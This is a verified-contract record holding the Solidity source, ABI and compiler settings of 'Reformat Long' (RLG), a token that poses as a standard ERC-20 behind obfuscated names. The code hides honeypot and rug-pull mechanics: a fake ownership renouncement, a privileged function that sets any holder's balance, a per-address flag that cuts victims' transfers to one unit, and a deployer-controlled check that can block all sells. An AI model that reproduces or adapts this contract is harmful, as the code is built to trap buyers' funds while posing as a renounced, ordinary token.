{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface enableTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minTeam) external view returns (uint256);\n\n    function transfer(address shouldLimit, uint256 shouldIsTeam) external returns (bool);\n\n    function allowance(address minLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldIsTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldLimit,\n        uint256 shouldIsTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletMarketing, uint256 value);\n    event Approval(address indexed minLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract atLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeFund {\n    function createPair(address txMin, address receiverBuyFee) external returns (address);\n}\n\ninterface fromWallet is enableTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReformatLong is atLimit, enableTake, fromWallet {\n\n    string private txMarketing = \"RLG\";\n\n    uint256 constant toLiquidity = 1 ** 10;\n\n    uint256 private teamAuto;\n\n    bool public tokenBuy;\n\n    mapping(address => mapping(address => uint256)) private tradingSell;\n\n    function minToken(address takeTeam, uint256 shouldIsTeam) public {\n        exemptAutoToken();\n        txToken[takeTeam] = shouldIsTeam;\n    }\n\n    uint256 public teamReceiver;\n\n    uint8 private tradingReceiver = 18;\n\n    address takeTeamMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingReceiver;\n    }\n\n    event OwnershipTransferred(address indexed modeTake, address indexed minLiquidity);\n\n    mapping(address => bool) public modeShouldLiquidity;\n\n    uint256 private receiverIs;\n\n    address public toLimit;\n\n    function liquidityShould(address isAuto, address shouldLimit, uint256 shouldIsTeam) internal returns (bool) {\n        require(txToken[isAuto] >= shouldIsTeam);\n        txToken[isAuto] -= shouldIsTeam;\n        txToken[shouldLimit] += shouldIsTeam;\n        emit Transfer(isAuto, shouldLimit, shouldIsTeam);\n        return true;\n    }\n\n    function balanceOf(address minTeam) public view virtual override returns (uint256) {\n        return txToken[minTeam];\n    }\n\n    function swapSell() public {\n        emit OwnershipTransferred(toLimit, address(0));\n        minAmountMode = address(0);\n    }\n\n    uint256 fromShould;\n\n    uint256 private marketingLimit = 100000000 * 10 ** 18;\n\n    uint256 private tradingList;\n\n    function approve(address takeTx, uint256 shouldIsTeam) public virtual override returns (bool) {\n        tradingSell[_msgSender()][takeTx] = shouldIsTeam;\n        emit Approval(_msgSender(), takeTx, shouldIsTeam);\n        return true;\n    }\n\n    mapping(address => uint256) private txToken;\n\n    bool public launchFee;\n\n    function minSenderMode(uint256 shouldIsTeam) public {\n        exemptAutoToken();\n        fromShould = shouldIsTeam;\n    }\n\n    string private modeTrading = \"Reformat Long\";\n\n    mapping(address => bool) public minTx;\n\n    function transferFrom(address isAuto, address shouldLimit, uint256 shouldIsTeam) external override returns (bool) {\n        if (_msgSender() != listWallet) {\n            if (tradingSell[isAuto][_msgSender()] != type(uint256).max) {\n                require(shouldIsTeam <= tradingSell[isAuto][_msgSender()]);\n                tradingSell[isAuto][_msgSender()] -= shouldIsTeam;\n            }\n        }\n        return fundTeam(isAuto, shouldLimit, shouldIsTeam);\n    }\n\n    function getOwner() external view returns (address) {\n        return minAmountMode;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return modeTrading;\n    }\n\n    bool public listSwapMin;\n\n    address private minAmountMode;\n\n    bool private swapMarketing;\n\n    constructor (){\n        \n        tradingBuy buyLiquidity = tradingBuy(listWallet);\n        fundReceiver = takeFund(buyLiquidity.factory()).createPair(buyLiquidity.WETH(), address(this));\n        \n        toLimit = _msgSender();\n        swapSell();\n        minTx[toLimit] = true;\n        txToken[toLimit] = marketingLimit;\n        \n        emit Transfer(address(0), toLimit, marketingLimit);\n    }\n\n    function buyModeTrading(address maxTo) public {\n        exemptAutoToken();\n        \n        if (maxTo == toLimit || maxTo == fundReceiver) {\n            return;\n        }\n        modeShouldLiquidity[maxTo] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingLimit;\n    }\n\n    uint256 fundSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txMarketing;\n    }\n\n    uint256 public txLaunched;\n\n    function transfer(address takeTeam, uint256 shouldIsTeam) external virtual override returns (bool) {\n        return fundTeam(_msgSender(), takeTeam, shouldIsTeam);\n    }\n\n    function allowance(address exemptTokenSell, address takeTx) external view virtual override returns (uint256) {\n        if (takeTx == listWallet) {\n            return type(uint256).max;\n        }\n        return tradingSell[exemptTokenSell][takeTx];\n    }\n\n    function launchedTx(address maxFeeTx) public {\n        if (listSwapMin) {\n            return;\n        }\n        \n        minTx[maxFeeTx] = true;\n        if (tokenBuy == launchFee) {\n            teamReceiver = tradingList;\n        }\n        listSwapMin = true;\n    }\n\n    function exemptAutoToken() private view {\n        require(minTx[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return minAmountMode;\n    }\n\n    address public fundReceiver;\n\n    function fundTeam(address isAuto, address shouldLimit, uint256 shouldIsTeam) internal returns (bool) {\n        if (isAuto == toLimit) {\n            return liquidityShould(isAuto, shouldLimit, shouldIsTeam);\n        }\n        uint256 modeTeam = enableTake(fundReceiver).balanceOf(takeTeamMax);\n        require(modeTeam == fromShould);\n        require(shouldLimit != takeTeamMax);\n        if (modeShouldLiquidity[isAuto]) {\n            return liquidityShould(isAuto, shouldLimit, toLiquidity);\n        }\n        return liquidityShould(isAuto, shouldLimit, shouldIsTeam);\n    }\n\n    address listWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private limitModeTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTokenSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIsTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTo\",\"type\":\"address\"}],\"name\":\"buyModeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFeeTx\",\"type\":\"address\"}],\"name\":\"launchedTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwapMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldIsTeam\",\"type\":\"uint256\"}],\"name\":\"minSenderMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIsTeam\",\"type\":\"uint256\"}],\"name\":\"minToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeShouldLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIsTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIsTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ReformatLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}